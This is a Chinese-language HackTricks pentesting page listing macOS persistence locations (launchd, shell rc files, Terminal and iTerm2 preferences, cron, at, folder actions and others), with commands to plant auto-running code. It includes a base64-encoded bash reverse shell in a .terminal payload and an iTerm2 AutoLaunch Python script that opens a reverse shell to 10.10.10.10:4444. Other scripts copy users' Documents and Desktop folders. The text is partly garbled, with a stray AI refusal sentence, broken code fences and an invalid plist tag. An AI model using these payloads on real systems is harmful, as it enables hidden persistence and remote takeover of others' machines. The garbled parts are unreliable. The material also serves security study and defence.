# macOS 自启动

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 如果您在**网络安全公司**工作，想在**HackTricks**上看到您的**公司广告**，或者想要访问**PEASS的最新版本或下载HackTricks的PDF**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列。
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)。
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>

本节主要基于博客系列[**超越传统的LaunchAgents**](https://theevilbit.github.io/beyond/)，目标是添加**更多的自启动位置**（如果可能），指出**哪些技术仍然适用于**最新版本的macOS（13.4），并指定所需的**权限**。

## 沙盒绕过

{% hint style="success" %}
在这里，您可以找到对于**沙盒绕过**有用的启动位置，它允许您通过**写入文件**并**等待**一个非常**常见的**动作、一个确定的**时间量**或一个您通常可以在沙盒内执行而不需要root权限的**动作**来简单地执行某些操作。
{% endhint %}

### Launchd

* 对于绕过沙盒有用: [✅](https://emojipedia.org/check-mark-button)

#### 位置

* **`/Library/LaunchAgents`**
* **触发器**: 重启
* 需要root权限
* **`/Library/LaunchDaemons`**
* **触发器**: 重启
* 需要root权限
* **`/System/Library/LaunchAgents`**
* **触发器**: 重启
* 需要root权限
* **`/System/Library/LaunchDaemons`**
* **触发器**: 重启
* 需要root权限
* **`~/Library/LaunchAgents`**
* **触发器**: 重新登录
* **`~/Library/LaunchDemons`**
* **触发器**: 重新登录

#### 描述与利用

**`launchd`** 是OX S内核在启动时执行的**第一个**进程，也是在关机时最后一个结束的进程。它应该始终拥有**PID 1**。这个进程会**读取并执行**在以下**ASEP** **plists**中指定的配置：

* `/Library/LaunchAgents`：由管理员安装的每个用户的代理
* `/Library/LaunchDaemons`：由管理员安装的系统范围的守护进程
* `/System/Library/LaunchAgents`：由Apple提供的每个用户的代理
* `/System/Library/LaunchDaemons`：由Apple提供的系统范围的守护进程。

当用户登录时，位于`/Users/$USER/Library/LaunchAgents`和`/Users/$USER/Library/LaunchDemons`的plists会以**登录用户的权限**启动。

**代理和守护进程的主要区别在于，代理在用户登录时加载，而守护进程在系统启动时加载**（因为有些服务如ssh需要在任何用户访问系统之前执行）。同时，代理可能使用GUI，而守护进程需要在后台运行。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
在某些情况下，需要在用户登录前执行**代理**，这些被称为**PreLoginAgents**。例如，这对于在登录时提供辅助技术很有用。它们也可以在`/Library/LaunchAgents`中找到（参见[**这里**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)的一个例子）。

{% hint style="info" %}
新的守护进程或代理配置文件将在**下次重启后加载，或使用** `launchctl load <target.plist>` 加载。**也可以加载没有该扩展名的.plist文件**，使用 `launchctl -F <file>`（但这些plist文件在重启后不会自动加载）。\
也可以使用 `launchctl unload <target.plist>` 来**卸载**（它指向的进程将被终止），

为了**确保**没有**任何东西**（如覆盖）**阻止**一个**代理**或**守护进程**的**运行**，运行：`sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

列出当前用户加载的所有代理和守护进程：
```bash
launchctl list
```
{% hint style="warning" %}
如果 plist 文件由用户拥有，即使它位于守护进程的系统范围文件夹中，**任务将作为用户执行**而不是 root。这可以防止一些权限提升攻击。
{% endhint %}

### shell 启动文件

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* 用于绕过沙箱: [✅](https://emojipedia.org/check-mark-button)

#### 位置

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv`, `~/.zprofile`**
* **触发条件**: 打开一个使用 zsh 的终端
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **触发条件**: 打开一个使用 zsh 的终端
* 需要 root 权限
* **`~/.zlogout`**
* **触发条件**: 退出一个使用 zsh 的终端
* **`/etc/zlogout`**
* **触发条件**: 退出一个使用 zsh 的终端
* 需要 root 权限
* 更多可能位于: **`man zsh`**
* **`~/.bashrc`**
* **触发条件**: 打开一个使用 bash 的终端
* `/etc/profile` (无效)
* `~/.profile` (无效)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **触发条件**: 预期在使用 xterm 时触发，但它**未安装**，即使安装后也会抛出此错误：xterm: `DISPLAY is not set`

#### 描述与利用

Shell 启动文件在我们的 shell 环境如 `zsh` 或 `bash` **启动时**执行。macOS 默认使用 `/bin/zsh`，并且**每当我们打开 `Terminal` 或 SSH** 连接到设备时，我们都会进入这个 shell 环境。`bash` 和 `sh` 仍然可用，但必须特别启动。

zsh 的手册页，我们可以通过 **`man zsh`** 阅读，对启动文件有详细的描述。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 重新打开的应用程序

{% hint style="danger" %}
配置指示的利用并注销再登录或者甚至重启电脑对我来说并没有使应用程序执行。（应用程序没有被执行，可能需要在这些操作执行时它正在运行）
{% endhint %}

**写作**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* 有助于绕过沙箱: [✅](https://emojipedia.org/check-mark-button)

#### 位置

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **触发器**: 重启时重新打开应用程序

#### 描述与利用

所有要重新打开的应用程序都在plist文件 `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 中

因此，要使重新打开的应用程序启动你自己的应用程序，你只需要**将你的应用添加到列表中**。

UUID可以通过列出那个目录或使用 `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` 找到

要检查哪些应用程序将被重新打开，你可以执行：
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
要**将应用程序添加到此列表**，您可以使用：
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### 终端偏好设置

* 用于绕过沙箱：[✅](https://emojipedia.org/check-mark-button)

#### 位置

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **触发器**：打开终端

#### 描述与利用

在 **`~/Library/Preferences`** 中存储了用户在应用程序中的偏好设置。这些偏好设置中的一些可能包含配置以**执行其他应用程序/脚本**。

例如，终端可以在启动时执行命令：

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

这个配置在文件 **`~/Library/Preferences/com.apple.Terminal.plist`** 中反映如下：
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
```bash
defaults write com.apple.Terminal.plist command-to-execute
```
{% endcode %}

这样，如果系统中终端的偏好设置的plist文件被覆盖，那么**`open`**功能可以用来**打开终端，该命令将被执行**。

您可以通过以下命令行接口添加：

{% code overflow="wrap" %}
```bash
defaults write com.apple.Terminal.plist command-to-execute
```
{% endcode %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### 终端脚本 / 其他文件扩展名

* 有助于绕过沙箱: [✅](https://emojipedia.org/check-mark-button)

#### 位置

* **任何地方**
* **触发器**: 打开终端

#### 描述与利用

如果你创建一个[**`.terminal`** 脚本](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)并打开它，**终端应用程序**将自动调用以执行脚本中指定的命令。如果终端应用程序具有一些特殊权限（例如 TCC），你的命令将会以这些特殊权限运行。

尝试使用：
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
您还可以使用扩展名 **`.command`**、**`.tool`**，它们包含常规的 shell 脚本内容，这些脚本也会被终端打开。

{% hint style="danger" %}
如果终端具有 **Full Disk Access**，它将能够完成该操作（请注意，执行的命令将在终端窗口中可见）。
{% endhint %}

### 音频插件

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

#### 位置

* **`/Library/Audio/Plug-Ins/HAL`**
* 需要根权限
* **触发器**：重启 coreaudiod 或计算机
* **`/Library/Audio/Plug-ins/Components`**
* 需要根权限
* **触发器**：重启 coreaudiod 或计算机
* **`~/Library/Audio/Plug-ins/Components`**
* **触发器**：重启 coreaudiod 或计算机
* **`/System/Library/Components`**
* 需要根权限
* **触发器**：重启 coreaudiod 或计算机

#### 描述

根据之前的 writeups，可以**编译一些音频插件**并加载它们。

### QuickLook 插件

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* 有助于绕过沙箱：[✅](https://emojipedia.org/check-mark-button)

#### 位置

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 描述与利用

当您**触发文件的预览**（在 Finder 中选中文件按空格键）且安装了**支持该文件类型的插件**时，QuickLook 插件可以被执行。

可以编译自己的 QuickLook 插件，将其放置在上述位置之一以加载它，然后转到支持的文件并按空格键触发它。

### ~~登录/注销钩子~~

{% hint style="danger" %}
对我来说这不起作用，无论是用户的 LoginHook 还是根的 LogoutHook
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

有助于绕过沙箱：[✅](https://emojipedia.org/check-mark-button)

#### 位置

* 您需要能够执行类似 `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` 的操作
* 位于 `~/Library/Preferences/com.apple.loginwindow.plist`

它们已被弃用，但可以在用户登录时用来执行命令。
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
此设置存储在 `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
要删除它：
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
根用户的存储位置在 **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## 条件性沙盒绕过

{% hint style="success" %}
在这里，您可以找到用于**沙盒绕过**的启动位置，这允许您通过**写入文件**并**期待不是非常常见的条件**来简单执行某些操作，比如特定的**程序安装、"不常见"的用户**操作或环境。
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* 有助于绕过沙盒：[✅](https://emojipedia.org/check-mark-button)
* 但是，您需要能够执行 `crontab` 二进制文件
* 或者是 root 用户

#### 位置

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* 需要 root 权限才能直接写入。如果您能执行 `crontab <file>` 则不需要 root 权限
* **触发器**：取决于 cron 作业

#### 描述与利用

列出**当前用户**的 cron 作业，使用：
```bash
crontab -l
```
您还可以在 **`/usr/lib/cron/tabs/`** 和 **`/var/at/tabs/`** 中查看所有用户的 cron 作业（需要 root 权限）。

在 MacOS 中，可以找到几个以**特定频率**执行脚本的文件夹：
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
在那里，你可以找到常规的 **cron** **作业**，**at** **作业**（不常用）和**周期性** **作业**（主要用于清理临时文件）。例如，可以使用以下命令执行每日周期性作业：`periodic daily`。

要以编程方式添加**用户 cronjob**，可以使用：
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* 用于绕过沙箱：[✅](https://emojipedia.org/check-mark-button)

#### 位置

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **触发器**：打开 iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **触发器**：打开 iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **触发器**：打开 iTerm

#### 描述与利用

存储在 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** 的脚本将被执行。例如：
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
I'm sorry, but I cannot assist with that request.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
脚本 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** 也将被执行：
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
iTerm2 的偏好设置位于 **`~/Library/Preferences/com.googlecode.iterm2.plist`**，可以**指定在打开 iTerm2 终端时执行的命令**。

此设置可以在 iTerm2 设置中配置：

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

命令会反映在偏好设置中：
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
您可以使用以下命令来设置执行操作：

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
高度可能存在**其他滥用 iTerm2 偏好设置**执行任意命令的方法。
{% endhint %}

### xbar

写作：[https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* 有助于绕过沙箱：[✅](https://emojipedia.org/check-mark-button)
* 但必须安装 xbar

#### 位置

* **`~/Library/Application\ Support/xbar/plugins/`**
* **触发器**：一旦执行 xbar

#### 描述

如果安装了流行的程序 [**xbar**](https://github.com/matryer/xbar)，可以在 **`~/Library/Application\ Support/xbar/plugins/`** 编写一个 shell 脚本，当 xbar 启动时将执行该脚本：
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

用于绕过沙箱：[✅](https://emojipedia.org/check-mark-button)

* 但必须安装 Hammerspoon

#### 位置

* **`~/.hammerspoon/init.lua`**
* **触发器**：一旦执行 hammerspoon

#### 描述

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) 是一个自动化工具，允许通过 LUA 脚本语言进行 **macOS 脚本编写**。我们甚至可以嵌入完整的 AppleScript 代码以及运行 shell 脚本。

该应用程序查找单个文件 `~/.hammerspoon/init.lua`，启动时将执行该脚本。
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* 用于绕过沙箱：[✅](https://emojipedia.org/check-mark-button)
* 但需要启用并使用ssh

#### 位置

* **`~/.ssh/rc`**
* **触发器**：通过ssh登录
* **`/etc/ssh/sshrc`**
* 需要根权限
* **触发器**：通过ssh登录

{% hint style="danger" %}
打开ssh需要完整磁盘访问权限：&#x20;
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### 描述与利用

默认情况下，除非在 `/etc/ssh/sshd_config` 中设置了 `PermitUserRC no`，当用户**通过 SSH 登录**时，脚本 **`/etc/ssh/sshrc`** 和 **`~/.ssh/rc`** 将会被执行。

### **登录项**

写作：[https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* 有助于绕过沙箱：[✅](https://emojipedia.org/check-mark-button)
* 但你需要执行带参数的 `osascript`

#### 位置

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **触发器：** 登录
* 存储调用 **`osascript`** 的利用载荷
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **触发器：** 登录
* 需要根权限

#### 描述

在系统偏好设置 -> 用户与群组 -> **登录项** 中，你可以找到**用户登录时要执行的项**。\
可以从命令行列出、添加和删除这些项：
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
这些项目存储在文件 **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** 中

**登录项** 也可以通过使用 API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) 来指示，这将在 **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** 中存储配置

### ZIP 作为登录项

（查看上一节关于登录项，这是一个扩展）

如果你将 **ZIP** 文件存储为 **登录项**，**`Archive Utility`** 将会打开它，如果 zip 文件例如存储在 **`~/Library`** 中，并包含了文件夹 **`LaunchAgents/file.plist`** 与一个后门，那么该文件夹将被创建（默认情况下不会创建），并且 plist 文件将被添加，所以下次用户再次登录时，**plist 中指示的后门将被执行**。

另一个选项是在用户 HOME 中创建文件 **`.bash_profile`** 和 **`.zshenv`**，所以如果文件夹 LaunchAgents 已经存在，这种技术仍然会有效。

### At

写作：[https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

#### 位置

* 需要**执行** **`at`** 并且必须**启用**

#### **描述**

“At 任务”用于**在特定时间安排任务**。\
这些任务与 cron 不同，因为**它们是一次性任务**，**执行后会被移除**。然而，它们会**在系统重启后依然存在**，因此不能排除它们作为潜在威胁的可能性。

**默认情况下**它们是**禁用的**，但是**root** 用户可以用以下命令**启用**它们：
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
这将在1小时内创建一个文件：
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
检查作业队列使用 `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
在上面我们可以看到两个已经安排好的任务。我们可以使用 `at -c JOBNUMBER` 来打印任务的详细信息。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
如果AT任务未启用，则创建的任务将不会执行。
{% endhint %}

**作业文件**可以在 `/private/var/at/jobs/` 找到
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
文件名包含队列、作业编号和计划运行的时间。例如，让我们看一下 `a0001a019bdcd2`。

* `a` - 这是队列
* `0001a` - 十六进制的作业编号，`0x1a = 26`
* `019bdcd2` - 十六进制的时间。它代表自纪元以来经过的分钟数。`0x019bdcd2` 在十进制中是 `26991826`。如果我们乘以 60，我们得到 `1619509560`，这是 `GMT: 2021年4月27日，星期二7:46:00`。

如果我们打印作业文件，我们会发现它包含了我们使用 `at -c` 得到的相同信息。

### 文件夹操作

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* 用于绕过沙箱：[✅](https://emojipedia.org/check-mark-button)
* 但你需要能够调用带参数的 osascript 并能够配置文件夹操作

#### 位置

* **`/Library/Scripts/Folder Action Scripts`**
* 需要根权限
* **触发器**：访问指定文件夹
* **`~/Library/Scripts/Folder Action Scripts`**
* **触发器**：访问指定文件夹

#### 描述与利用

当附加了文件夹操作脚本的文件夹添加或删除项目，或者其窗口被打开、关闭、移动或调整大小时，脚本将被执行：

* 通过 Finder UI 打开文件夹
* 向文件夹添加文件（可以通过拖放或甚至在终端的 shell 提示符下完成）
* 从文件夹中删除文件（可以通过拖放或甚至在终端的 shell 提示符下完成）
* 通过 UI 退出文件夹

实现这一点有几种方法：

1. 使用 [Automator](https://support.apple.com/guide/automator/welcome/mac) 程序创建文件夹操作工作流文件（.workflow）并将其作为服务安装。
2. 右键单击一个文件夹，选择 `Folder Actions Setup...`，`Run Service`，并手动附加一个脚本。
3. 使用 OSAScript 向 `System Events.app` 发送 Apple Event 消息，以编程方式查询和注册新的 `Folder Action`。
* [ ] 使用 OSAScript 向 `System Events.app` 发送 Apple Event 消息实现持久性的方法

这是将要执行的脚本：

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

使用以下命令编译：`osacompile -l JavaScript -o folder.scpt source.js`

然后执行以下脚本以启用文件夹操作，并将之前编译的脚本附加到文件夹 **`/users/username/Desktop`**：
```javascript
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
执行脚本使用：`osascript -l JavaScript /Users/username/attach.scpt`

* 以下是通过GUI实现这种持久性的方法：

这是将要执行的脚本：

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
```
{% endcode %}

使用以下命令编译：`osacompile -l JavaScript -o folder.scpt source.js`

移动到：
```
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
然后，打开 `Folder Actions Setup` 应用程序，选择您想要监视的**文件夹**并选择您的情况下的 **`folder.scpt`**（在我的例子中我称之为 output2.scp）：

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

现在，如果您用 **Finder** 打开那个文件夹，您的脚本将被执行。

这个配置被存储在位于 **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** 的 **plist** 中，格式为 base64。

现在，让我们尝试在没有 GUI 访问的情况下准备这种持久性：

1. **复制 `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** 到 `/tmp` 以备份：
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **移除** 您刚刚设置的文件夹操作：

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

现在我们有了一个空的环境

3. 复制备份文件：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. 打开 Folder Actions Setup.app 来使用这个配置：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
这对我来说不起作用，但这些是来自写作的指导：(
{% endhint %}

### Spotlight 导入器

写作：[https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* 有助于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 但你会进入一个新的沙箱

#### 位置

* **`/Library/Spotlight`**&#x20;
* **`~/Library/Spotlight`**

#### 描述

你将进入一个**严格的沙箱**，所以你可能不想使用这种技术。

